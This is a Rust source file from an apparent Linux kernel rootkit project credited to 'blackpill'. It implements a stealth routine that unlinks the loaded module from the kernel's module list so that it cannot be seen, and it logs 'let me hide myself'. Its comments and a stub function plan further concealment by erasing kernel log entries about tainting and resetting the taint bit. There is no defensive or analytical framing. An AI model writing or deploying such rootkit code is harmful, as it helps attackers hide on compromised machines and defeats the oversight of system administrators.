//! Original Authors: https://github.com/DualHorizon/blackpill
//! Edited by: Began Bajrami

use kernel::bindings;
use kernel::prelude::*;
use kernel::ThisModule;

pub(crate) fn hidemod(module: &'static ThisModule) {
    _remove_mod_from_list(module);
    // Here we can implement other hiding funcitonalities, like kernel log deletion and remove
    // reset tainted bit
}

// Original Author of this method: Began Bajrami
pub(crate) fn _remove_log(module: &'static ThisModule) {
    // I want to remove logs in kernel that tells user kernel was tainted
}

pub(crate) fn _remove_mod_from_list(module: &'static ThisModule) {
    pr_info!("let me hide myself...\n");
    let module_ptr = unsafe { *(module.as_ptr()) };
    let modules = module_ptr.list;

    let next_module = modules.next;
    let prev_module = modules.prev;

    unsafe {
        (*prev_module).next = next_module;
        (*next_module).prev = prev_module;
    }
}
